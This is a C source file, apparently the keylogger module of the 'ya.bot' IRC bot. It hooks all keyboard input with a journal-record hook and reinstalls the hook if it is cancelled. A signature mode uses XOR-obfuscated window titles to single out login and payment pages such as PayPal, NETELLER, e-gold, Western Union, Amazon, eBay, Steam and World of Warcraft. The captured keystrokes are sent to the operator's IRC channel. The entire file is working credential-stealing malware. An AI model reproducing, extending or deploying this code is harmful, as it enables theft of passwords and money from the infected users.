/*  ya.bot  */

#include "bot.h"

#ifndef NO_KEYLOG
DWORD WINAPI keylog_buffer(LPVOID param)
{
	SKeylogInfo s_ki = *((SKeylogInfo *)param);

#ifndef NO_DEBUG
		debug_print("[DEBUG] Starting keylog buffer thread, keylog_buffer()");
#endif

	while (g_hHook)
	{
		if (g_bSignature)
		{
			if (strlen(g_szLog) >= 135)
			{
				if (!s_ki.m_bSilent)
						irc_message(s_ki.m_bsock,
								(char *)string_ircprivmsg, s_ki.m_szResultChannel,
								(char *)string_keylogsignature,
								CGREEN, string_replykeylog, CEND, string_replydotbot,
								CBLUE, CEND, g_szLog);
					g_hLastFocus = NULL;
					memset(g_szLog, 0, sizeof(g_szLog));
			}
		}
		else
		{
			if (strlen(g_szLog) >= 420)
			{
				if (!s_ki.m_bSilent)
						irc_message(s_ki.m_bsock,
								(char *)string_ircprivmsg, s_ki.m_szResultChannel,
								(char *)string_keyloglog,
								CGREEN, string_replykeylog, CEND, string_replydotbot,
								CBLUE, CEND, g_szLog);
					g_hLastFocus = NULL;
					memset(g_szLog, 0, sizeof(g_szLog));
			}
		}
			Sleep(10);
	}
		return 0;
}

LRESULT CALLBACK keylog_event(int nCode, WPARAM wParam, LPARAM lParam)
{
	char *rgpszSignatures[] =
	{
			//BF2 (v
			"\x8B\x8F\xFB\xE9\xE1\xBF",
			//Diablo II
			"\x8D\xA0\xA8\xAB\xA5\xA6\xE9\x80\x80",
			//e-gold Account Access
			"\xAC\xE4\xAE\xA6\xA5\xAD\xE9\x88\xAA\xAA\xA6\xBC\xA7\xBD\xE9\x88\xAA\xAA\xAC\xBA"
			"\xBA",
			//Google Checkout
			"\x8E\xA6\xA6\xAE\xA5\xAC\xE9\x8A\xA1\xAC\xAA\xA2\xA6\xBC\xBD",
			//Login - Steam
			"\x85\xA6\xAE\xA0\xA7\xE9\xE4\xE9\x9A\xBD\xAC\xA8\xA4",
			//NETELLER - Sign In To Your Account
			"\x87\x8C\x9D\x8C\x85\x85\x8C\x9B\xE9\xE4\xE9\x9A\xA0\xAE\xA7\xE9\x80\xA7\xE9\x9D"
			"\xA6\xE9\x90\xA6\xBC\xBB\xE9\x88\xAA\xAA\xA6\xBC\xA7\xBD",
			//Paynova
			"\x99\xA8\xB0\xA7\xA6\xBF\xA8",
			//PayPal - Login
			"\x99\xA8\xB0\x99\xA8\xA5\xE9\xE4\xE9\x85\xA6\xAE\xA0\xA7",
			//PayPal - Welcome
			"\x99\xA8\xB0\x99\xA8\xA5\xE9\xE4\xE9\x9E\xAC\xA5\xAA\xA6\xA4\xAC",
			//PPPay.com - MONEY BY EMAIL - Person to Person Payments Made Simple
			"\x99\x99\x99\xA8\xB0\xE7\xAA\xA6\xA4\xE9\xE4\xE9\x84\x86\x87\x8C\x90\xE9\x8B\x90"
			"\xE9\x8C\x84\x88\x80\x85\xE9\xE4\xE9\x99\xAC\xBB\xBA\xA6\xA7\xE9\xBD\xA6\xE9\x99"
			"\xAC\xBB\xBA\xA6\xA7\xE9\x99\xA8\xB0\xA4\xAC\xA7\xBD\xBA\xE9\x84\xA8\xAD\xAC\xE9"
			"\x9A\xA0\xA4\xB9\xA5\xAC",
			//regLogin (Western Union)
			"\xBB\xAC\xAE\x85\xA6\xAE\xA0\xA7",
			//Sign In (Amazon & eBay)
			"\x9A\xA0\xAE\xA7\xE9\x80\xA7",
			//StormPay.com - The Universal Payment System
			"\x9A\xBD\xA6\xBB\xA4\x99\xA8\xB0\xE7\xAA\xA6\xA4\xE9\xE4\xE9\x9D\xA1\xAC\xE9\x9C"
			"\xA7\xA0\xBF\xAC\xBB\xBA\xA8\xA5\xE9\x99\xA8\xB0\xA4\xAC\xA7\xBD\xE9\x9A\xB0\xBA"
			"\xBD\xAC\xA4",
			//World Of Warcraft
			"\x9E\xA6\xBB\xA5\xAD\xE9\x86\xAF\xE9\x9E\xA8\xBB\xAA\xBB\xA8\xAF\xBD",
			//World Of Warcraft Account Creation
			"\x9E\xA6\xBB\xA5\xAD\xE9\x86\xAF\xE9\x9E\xA8\xBB\xAA\xBB\xA8\xAF\xBD\xE9\x88\xAA"
			"\xAA\xA6\xBC\xA7\xBD\xE9\x8A\xBB\xAC\xA8\xBD\xA0\xA6\xA7",
			NULL
	};
	BYTE byBuffer[MEDBUF];
	char szBuffer[MEDBUF], szCaption[MEDBUF], szChar[4], szLast[MEDBUF];
	DWORD dwKey, dwScan;
	EVENTMSG eventMsg = *((EVENTMSG*)lParam);
	HWND hFocus;
	int i, nCount;
	WORD wChar;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Starting keylog event thread, keylog_event()");
#endif

		hFocus = GetActiveWindow();
	if (nCode == HC_ACTION)
	{
		if (eventMsg.message == WM_KEYDOWN)
		{
			if (g_bSignature)
			{
					nCount = GetWindowText(hFocus, szCaption, sizeof(szCaption) - 1);
				if (lstrcmpi(szCaption, szLast) != 0)
				{
					for (i = 0; i < ARRAYSIZE(rgpszSignatures); i++)
					{
						if (!rgpszSignatures[i])
								break;
							crypto_xor(rgpszSignatures[i], xorkey);
						if (stristr(szCaption, rgpszSignatures[i]))
						{
							if (nCount)
							{
								_snprintf(szBuffer, sizeof(szBuffer) - 1,
										string_keylogcaption,
										CBLUE, rgpszSignatures[i], CEND);
								strncat(g_szLog,
										szBuffer,
										(sizeof(g_szLog) - strlen(g_szLog)) - 1);
							}
						}
							crypto_xor(rgpszSignatures[i], xorkey);
					}
						strncpy(szLast, szCaption,  sizeof(szLast) - 1);
				}
				for (i = 0; i < ARRAYSIZE(rgpszSignatures); i++)
				{
					if (!rgpszSignatures[i])
							break;
						crypto_xor(rgpszSignatures[i], xorkey);
					if (stristr(szCaption, rgpszSignatures[i]))
					{
							dwKey = LOBYTE(eventMsg.paramL);
							dwScan = (HIBYTE(eventMsg.paramL)) << 16;
							nCount = GetKeyNameText(dwScan, szBuffer, sizeof(szBuffer) - 1);
						if (nCount == 1)
						{
								GetKeyboardState(byBuffer);
								nCount = ToAsciiEx(dwKey,
										dwScan,
										byBuffer,
										&wChar,
										0,
										GetKeyboardLayout(0));
								_snprintf(szChar, sizeof(szChar) - 1,
										string_netutilsfpchar,
										wChar);
								strncat(g_szLog,
										szChar,
										(sizeof(g_szLog) - strlen(g_szLog)) - 1);
						}
						else
						{
							if (dwKey == VK_SPACE)
							{
									szBuffer[0] = ' ';
									szBuffer[1] = '\0';
									strncat(g_szLog,
											szBuffer,
											(sizeof(g_szLog) - strlen(g_szLog)) - 1);
							}
							else
							{
									strncat(g_szLog,
											CBLUE,
											(sizeof(g_szLog) - strlen(g_szLog)) - 1);
									strncat(g_szLog, "[", (sizeof(g_szLog) - strlen(g_szLog)) - 1);
									strncat(g_szLog,
											CEND,
											(sizeof(g_szLog) - strlen(g_szLog)) - 1);
									strncat(g_szLog,
											szBuffer,
											(sizeof(g_szLog) - strlen(g_szLog)) - 1);
									strncat(g_szLog,
											CBLUE,
											(sizeof(g_szLog) - strlen(g_szLog)) - 1);
									strncat(g_szLog, "]", (sizeof(g_szLog) - strlen(g_szLog)) - 1);
									strncat(g_szLog,
											CEND,
											(sizeof(g_szLog) - strlen(g_szLog)) - 1);
							}
						}
					}
						crypto_xor(rgpszSignatures[i], xorkey);
				}
			}
			else
			{
				if (g_hLastFocus != hFocus)
				{
						g_hLastFocus = hFocus;
						nCount = GetWindowText(hFocus, szCaption, sizeof(szCaption) - 1);
					if (nCount)
					{
						if (nCount > 32)
						{
								szCaption[32] = '\0';
								strncat(szCaption,
										"...\0",
										(sizeof(szCaption) - strlen(szCaption)) - 1);
						}
							_snprintf(szBuffer, sizeof(szBuffer) - 1,
									string_keylogcaption,
									CBLUE, szCaption, CEND);
							strncat(g_szLog, szBuffer, (sizeof(g_szLog) - strlen(g_szLog)) - 1);
					}
				}
					dwKey = LOBYTE(eventMsg.paramL);
					dwScan = (HIBYTE(eventMsg.paramL)) << 16;
					nCount = GetKeyNameText(dwScan, szBuffer, sizeof(szBuffer) - 1);
				if (nCount == 1)
				{
						GetKeyboardState(byBuffer);
						nCount = ToAsciiEx(dwKey,
								dwScan,
								byBuffer,
								&wChar,
								0,
								GetKeyboardLayout(0));
						_snprintf(szChar, sizeof(szChar) - 1, string_netutilsfpchar, wChar);
						strncat(g_szLog,
								szChar,
								(sizeof(g_szLog) - strlen(g_szLog)) - 1);
				}
				else
				{
					if (dwKey == VK_SPACE)
					{
							szBuffer[0] = ' ';
							szBuffer[1] = '\0';
							strncat(g_szLog, szBuffer, (sizeof(g_szLog) - strlen(g_szLog)) - 1);
					}
					else
					{
							strncat(g_szLog, CBLUE, (sizeof(g_szLog) - strlen(g_szLog)) - 1);
							strncat(g_szLog, "[", (sizeof(g_szLog) - strlen(g_szLog)) - 1);
							strncat(g_szLog, CEND, (sizeof(g_szLog) - strlen(g_szLog)) - 1);
							strncat(g_szLog, szBuffer, (sizeof(g_szLog) - strlen(g_szLog)) - 1);
							strncat(g_szLog, CBLUE, (sizeof(g_szLog) - strlen(g_szLog)) - 1);
							strncat(g_szLog, "]", (sizeof(g_szLog) - strlen(g_szLog)) - 1);
							strncat(g_szLog, CEND, (sizeof(g_szLog) - strlen(g_szLog)) - 1);
					}
				}
			}
		}
	}
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

DWORD WINAPI keylog_main(LPVOID param)
{
	BYTE byState[MEDBUF];
	HMODULE hModule;
	MSG msg;
	SKeylogInfo s_ki = *((SKeylogInfo *)param);

#ifndef NO_DEBUG
		debug_print("[DEBUG] Starting keylog thread, keylog_main()");
#endif

		hModule = GetModuleHandle(NULL);
		g_hHook = SetWindowsHookEx(WH_JOURNALRECORD, &keylog_event, hModule, 0);
	if (g_hHook)
	{
			memset(g_szLog, 0, sizeof(g_szLog));
			CreateThread(NULL, 0, &keylog_buffer, &s_ki, 0, NULL);
		if (g_bSignature)
		{
			if ((!s_ki.m_bSilent) && (s_ki.m_bVerbose))
					irc_message(s_ki.m_bsock, s_ki.m_szAction, s_ki.m_szDestination,
							(char *)string_keylogsignaturestarted,
							CBLUE, string_replykeylog, CEND, string_replydotbot);
		}
		else
		{
			if ((!s_ki.m_bSilent) && (s_ki.m_bVerbose))
					irc_message(s_ki.m_bsock, s_ki.m_szAction, s_ki.m_szDestination,
							(char *)string_keylogstarted,
							CBLUE, string_replykeylog, CEND, string_replydotbot);
		}
		while (GetMessage(&msg, NULL, 0, 0))
		{
			if (msg.message == WM_CANCELJOURNAL) 
			{
					SetKeyboardState(byState);
					g_hHook = SetWindowsHookEx(WH_JOURNALRECORD, keylog_event, hModule, 0);
				if (!g_hHook)
						break;
			}
				DispatchMessage(&msg);
		}
	}
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
		g_hLastFocus = NULL;
		memset(g_szLog, 0, sizeof(g_szLog));
		g_bSignature = FALSE;
	if ((!s_ki.m_bSilent) && (s_ki.m_bVerbose))
			irc_message(s_ki.m_bsock, s_ki.m_szAction, s_ki.m_szDestination,
					(char *)string_keylogfailed,
					CRED, string_replykeylog, CEND, string_replydotbot);
		thread_remove(THREAD_KEYLOG);
		return 0;
}
#endif